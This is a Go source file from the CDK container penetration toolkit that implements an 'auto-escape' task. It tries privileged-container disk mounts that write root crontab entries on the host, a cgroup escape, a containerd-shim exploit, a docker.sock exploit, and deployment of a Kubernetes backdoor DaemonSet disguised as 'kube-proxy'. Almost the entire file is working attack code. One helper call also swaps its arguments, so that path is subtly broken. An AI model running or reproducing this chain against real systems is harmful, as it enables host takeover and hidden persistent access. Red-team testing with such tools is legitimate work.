//go:build !thin && !no_containerd_shim_pwn && !no_k8s_shadow_apiserver && linux
// +build !thin,!no_containerd_shim_pwn,!no_k8s_shadow_apiserver,linux

/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package task

import (
	"fmt"
	"github.com/cdk-team/CDK/pkg/exploit/escaping"
	"github.com/cdk-team/CDK/pkg/exploit/persistence"
	"log"

	"github.com/cdk-team/CDK/pkg/cli"
	"github.com/cdk-team/CDK/pkg/evaluate"
	"github.com/cdk-team/CDK/pkg/plugin"
	"github.com/cdk-team/CDK/pkg/tool/kubectl"
	"github.com/cdk-team/CDK/pkg/util"
)

func autoEscape(shellCommand string) bool {

	success := false

	// 1. escape privileged container
	fmt.Printf("\n[Auto Escape - Privileged Container]\n")
	isPrivContainer := evaluate.GetProcCapabilities()
	if isPrivContainer {
		// try to write crontab after running device-mount exploit
		log.Println("starting to deploy exploit")
		err, mountedDirs := escaping.AllDiskMount()
		if err != nil {
			log.Println(err)
		} else {
			fmt.Println(mountedDirs)
			for _, mountedDir := range mountedDirs {
				crontabDir := mountedDir + "/etc/crontab"
				log.Println("trying to write crontab to: ", crontabDir)
				err := util.WriteShellcodeToCrontab("# CDK auto exploit via mounted device in privileged container", crontabDir, shellCommand)
				if err != nil {
					log.Println(err)
				} else {
					log.Println("exploit success, shellcodes wrote to: ", crontabDir)
					success = true
				}
			}
		}

		// try to exec shell cmd via cgroup-mount exploit
		err = escaping.EscapeCgroup(shellCommand, "memory")
		if err != nil {
			log.Println(err)
		} else {
			log.Println("exploit success.")
			success = true
		}
	} else {
		log.Println("not privileged container.")
	}

	// 2. escape --net=host
	fmt.Printf("\n[Auto Escape - Shared Net Namespace]\n")
	err := escaping.ContainerdPwn(shellCommand, "", "")
	if err != nil {
		log.Println(err)
		log.Println("exploit failed.")
	} else {
		log.Println("exploit success.")
		success = true
	}

	// 3. escape docker.sock
	fmt.Printf("\n[Auto Escape - docker.sock]\n")

	// write shellcode to host /etc/crontab via mounted dir
	crontabCMD := wrapShellCMDWithCrontab("/host/etc/crontab", shellCommand, "# CDK auto exploit via docker.sock")

	if escaping.DockerSockExploit("/var/run/docker.sock", crontabCMD) {
		log.Println("exploit success.")
		success = true
	} else {
		log.Println("exploit failed")
	}

	// 4. escape mounted lxcfs
	//success = escaping.ExploitLXCFS()
	//if success {
	//	log.Println("exploit success.")
	//} else {
	//	log.Println("exploit failed")
	//}

	k8sExploit := false
	// 4. check k8s anonymous login
	fmt.Printf("\n[Auto Escape - K8s API Server]\n")
	anonymousLogin := evaluate.CheckK8sAnonymousLogin()
	privServiceAccount := evaluate.CheckPrivilegedK8sServiceAccount(conf.K8sSATokenDefaultPath)

	k8sExploit = privServiceAccount || anonymousLogin

	if !k8sExploit {
		log.Println("exploit failed")
	} else {
		log.Println("authorize success")

		var tokenPath string
		if privServiceAccount {
			tokenPath = "default"
		} else {
			tokenPath = "anonymous"
		}

		addr, err := kubectl.ApiServerAddr()
		if err != nil {
			fmt.Println(err)
		} else {

			// k8s backdoor daemonset
			fmt.Printf("\n[Auto Escape - Deploy K8s Backdoor Daemonset]\n")

			// write shellcode to host /etc/crontab via mounted dir
			crontabCMD := wrapShellCMDWithCrontab("# CDK auto exploit via K8s backdoor daemonset", "/host-root/etc/crontab", shellCommand)

			if persistence.DeployBackdoorDaemonset(addr, tokenPath, "alpine:latest", crontabCMD, "kube-proxy") {
				log.Println("exploit success")
				success = true
			} else {
				log.Println("exploit failed")
			}

			// k8s shadow api-server
		}

	}

	return success
}

func wrapShellCMDWithCrontab(crontab string, shellcmd string, header string) string {
	return fmt.Sprintf("echo \"\n%s\n* * * * * root %s\" >> %s", header, shellcmd, crontab)
}

// task interface
type taskAutoEscapeS struct{}

func (p taskAutoEscapeS) Desc() string {
	return "Escape container in different ways then let target execute <cmd>."
}
func (p taskAutoEscapeS) Exec() bool {
	cmd := cli.Args["<cmd>"].(string)

	log.Printf("%s\n", util.RedBold.Sprint("Caution: Flag auto-escape is deprecated as of CDK v1.5.1, and will be archived in v2.0. We recommend migrating to `./cdk eva --full` and `./cdk run`."))

	if autoEscape(cmd) {
		log.Println("all exploits are finished, auto exploit success!")
	} else {
		log.Println("all exploits are finished, auto exploit failed.")
	}

	return true
}

func init() {
	task := taskAutoEscapeS{}
	plugin.RegisterTask("auto-escape", task)
}
